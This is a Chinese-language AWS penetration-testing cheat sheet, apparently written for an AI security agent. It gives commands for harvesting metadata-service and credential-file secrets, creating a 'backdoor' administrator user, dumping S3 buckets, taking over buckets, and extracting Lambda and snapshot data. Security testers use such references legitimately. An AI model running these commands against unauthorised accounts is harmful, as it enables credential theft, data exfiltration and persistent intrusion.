# AWS 安全

AWS (Amazon Web Services) 是全球最大的云服务提供商，其安全测试涉及IAM、S3、EC2、Lambda等多个服务。

## 信息收集

### 元数据服务
```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 (需要 Token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### 凭证位置
```bash
# 环境变量
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# 配置文件
cat ~/.aws/credentials
cat ~/.aws/config

# EC2 实例角色
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 枚举
```bash
# 当前身份
aws sts get-caller-identity

# 账户信息
aws sts get-account-authorization-details

# 区域
aws ec2 describe-regions
```

## IAM 攻击

### 权限枚举
```bash
# 列出用户
aws iam list-users

# 列出角色
aws iam list-roles

# 列出策略
aws iam list-policies

# 获取用户策略
aws iam list-user-policies --user-name <user>
aws iam list-attached-user-policies --user-name <user>

# 获取策略详情
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <version>
```

### 权限提升
```bash
# 创建访问密钥
aws iam create-access-key --user-name <user>

# 附加策略
aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建用户
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# 修改信任策略
aws iam update-assume-role-policy --role-name <role> --policy-document file://trust-policy.json
```

### 凭证泄露
```bash
# 搜索 GitHub
# AWS_ACCESS_KEY_ID
# AWS_SECRET_ACCESS_KEY

# 搜索 S3
aws s3 ls s3://bucket --recursive | grep -i credential
```

## S3 攻击

### 枚举 Bucket
```bash
# 列出 Bucket
aws s3 ls

# 列出文件
aws s3 ls s3://bucket-name --recursive

# 下载文件
aws s3 cp s3://bucket-name/file.txt .
aws s3 sync s3://bucket-name ./local-dir
```

### 公开 Bucket
```bash
# 检查 ACL
aws s3api get-bucket-acl --bucket bucket-name

# 检查策略
aws s3api get-bucket-policy --bucket bucket-name

# 匿名访问
curl https://bucket-name.s3.amazonaws.com/
aws s3 ls s3://bucket-name --no-sign-request
```

### 数据泄露
```bash
# 搜索敏感文件
aws s3 ls s3://bucket --recursive | grep -E '\.key|\.pem|password|secret|credential'

# 下载所有文件
aws s3 sync s3://bucket ./bucket-dump
```

### Bucket 接管
```bash
# 查找已删除但仍被引用的 Bucket
# 创建同名 Bucket
aws s3 mb s3://target-bucket
```

## EC2 攻击

### 实例枚举
```bash
# 列出实例
aws ec2 describe-instances

# 获取实例详情
aws ec2 describe-instances --instance-ids <id>

# 列出安全组
aws ec2 describe-security-groups

# 列出密钥对
aws ec2 describe-key-pairs
```

### 快照
```bash
# 列出快照
aws ec2 describe-snapshots --owner-ids self

# 公开快照
aws ec2 describe-snapshots --filters "Name=owner-id,Values=<account-id>" --query "Snapshots[?Public==\`true\`]"

# 创建卷
aws ec2 create-volume --snapshot-id <snapshot-id> --availability-zone us-east-1a

# 挂载卷
aws ec2 attach-volume --volume-id <volume-id> --instance-id <instance-id> --device /dev/sdf
```

### 用户数据
```bash
# 获取用户数据
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text | base64 -d
```

## Lambda 攻击

### 函数枚举
```bash
# 列出函数
aws lambda list-functions

# 获取函数配置
aws lambda get-function --function-name <name>

# 获取函数代码
aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip
```

### 环境变量
```bash
# 查看环境变量
aws lambda get-function-configuration --function-name <name> --query 'Environment.Variables'
```

### 执行函数
```bash
# 调用函数
aws lambda invoke --function-name <name> --payload '{"key":"value"}' response.json
```

## RDS 攻击

### 数据库枚举
```bash
# 列出实例
aws rds describe-db-instances

# 获取快照
aws rds describe-db-snapshots

# 公开快照
aws rds describe-db-snapshots --snapshot-type public
```

### 快照恢复
```bash
# 恢复快照
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier restored-db --db-snapshot-identifier <snapshot-id>
```

## 自动化工具

### Pacu
```bash
# AWS 渗透测试框架
pacu
run iam__enum_permissions
run iam__privesc_scan
run s3__bucket_finder
```

### ScoutSuite
```bash
# 多云安全审计
scout aws
```

### Prowler
```bash
# AWS 安全最佳实践检查
prowler -M csv
```

### CloudMapper
```bash
# AWS 环境可视化
python cloudmapper.py collect --account-name <name>
python cloudmapper.py prepare --account-name <name>
python cloudmapper.py webserver
```

---

**AI 发挥空间**：
- 根据AWS服务选择合适的测试方法
- 识别AWS配置错误和权限问题
- 开发自动化枚举和利用脚本
- 分析IAM策略和权限关系

**反幻觉提示**：
- 不要假设所有AWS资源都可访问
- 验证凭证的实际权限
- 测试操作的实际效果
- 注意AWS操作可能触发告警
- 某些操作可能需要特定的IAM权限
